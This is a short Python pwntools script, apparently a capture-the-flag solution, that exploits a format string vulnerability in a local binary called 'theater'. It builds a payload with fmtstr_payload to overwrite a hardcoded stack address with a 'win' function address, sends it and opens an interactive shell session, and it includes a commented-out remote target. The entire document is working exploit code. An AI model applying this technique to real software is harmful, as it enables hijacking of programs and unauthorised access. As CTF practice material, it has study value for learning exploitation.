from pwn import *

win = 0x0000000000401366#0x0000000000401316
ret = 0x0000000000401464

# Load the binary
binary = ELF('./theater')
context.binary = binary

# Start the process (or connect to remote service)
p = process('./theater')
# p = remote('example.com', 1337)  # For remote exploitation

# Target address to overwrite (update based on analysis)
first_target_address = 0x00007fffffffd7f8#0x00007fffffffd918
second_target_address = 0x00007fffffffd91a

# Offset to the first format specifier
fmt_offset = 6

# Desired value to write (win function address split into parts)
low = win & 0xffff
high = (win >> 16) & 0xffff

payload = fmtstr_payload(fmt_offset, {first_target_address: win & 0xffffffff})

with open('payload', 'wb') as f:
    f.write(payload)
# Send the payload
p.sendline(payload)

# Interact with the process
p.interactive()
